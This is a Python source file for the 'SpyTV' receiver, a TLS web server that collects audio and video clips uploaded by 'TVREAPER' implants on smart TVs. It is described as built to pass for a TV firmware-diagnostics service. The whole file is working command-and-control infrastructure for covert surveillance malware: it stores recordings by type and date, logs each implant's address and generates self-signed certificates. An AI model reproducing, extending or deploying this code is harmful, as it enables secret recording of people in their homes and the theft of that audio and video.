#!/usr/bin/env python3
"""SpyTV TV-flow receiver: accepts audio (WAV) and video (JPEG) clips
from TVREAPER implants. Looks like any TV's firmware-diagnostics service."""
import ssl, os, json, datetime, logging
from http.server import BaseHTTPRequestHandler, HTTPServer

STORE = os.environ.get("TV_FLOW_STORE", os.path.join("logs", "tv_flow"))
os.makedirs(STORE, exist_ok=True)
logging.basicConfig(level=logging.INFO, filename="spytv_receiver.log")

class C4(BaseHTTPRequestHandler):
    def do_POST(self):
        try:
            n = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(n) or b""
            now = datetime.datetime.utcnow()
            # Sanitize filename to prevent path traversal
            fname = os.path.basename(self.path.split("/")[-1].split("?")[0])
            if not fname:
                fname = "unknown"
            day = now.strftime("%Y%m%d")
            kind = "audio" if "kind=audio" in self.path else "video"
            os.makedirs(f"{STORE}/{kind}/{day}", exist_ok=True)
            filepath = f"{STORE}/{kind}/{day}/{now.strftime('%H%M%S')}_{fname}"
            with open(filepath, "wb") as f: f.write(body)
            logging.info(f"{self.client_address[0]} {kind} {len(body)} {fname}")
            self.send_response(200); self.send_header("Content-Type","application/json")
            self.end_headers(); self.wfile.write(b'{"ok":true}')
        except Exception as e:
            logging.error(f"recv fail: {e}")
    def do_GET(self):  # health
        self.send_response(200); self.end_headers(); self.wfile.write(b'{"status":"ok"}')
    def log_message(self, *a): pass

def create_ssl_context():
    """CR-42 fix: Use ssl.SSLContext instead of removed ssl.wrap_socket."""
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    keyfile = os.environ.get("TV_FLOW_KEY", "certs/tv_flow.key")
    certfile = os.environ.get("TV_FLOW_CERT", "certs/tv_flow.crt")
    if os.path.exists(keyfile) and os.path.exists(certfile):
        context.load_cert_chain(certfile, keyfile)
    else:
        logging.warning(f"SSL certs not found at {certfile}/{keyfile}, generating self-signed...")
        # For production, provide real certs. This is a fallback.
        import tempfile
        from subprocess import run as subprocess_run
        subprocess_run(["openssl", "req", "-x509", "-newkey", "rsa:2048",
                        "-keyout", keyfile, "-out", certfile,
                        "-days", "365", "-nodes", "-subj", "/CN=localhost"],
                       capture_output=True)
        if os.path.exists(keyfile) and os.path.exists(certfile):
            context.load_cert_chain(certfile, keyfile)
    return context

if __name__ == "__main__":
    port = int(os.environ.get("TV_FLOW_PORT", "7443"))
    srv = HTTPServer(("0.0.0.0", port), C4)
    context = create_ssl_context()
    srv.socket = context.wrap_socket(srv.socket, server_side=True)
    print(f"C4 TV-flow receiver on :{port}")
    srv.serve_forever()
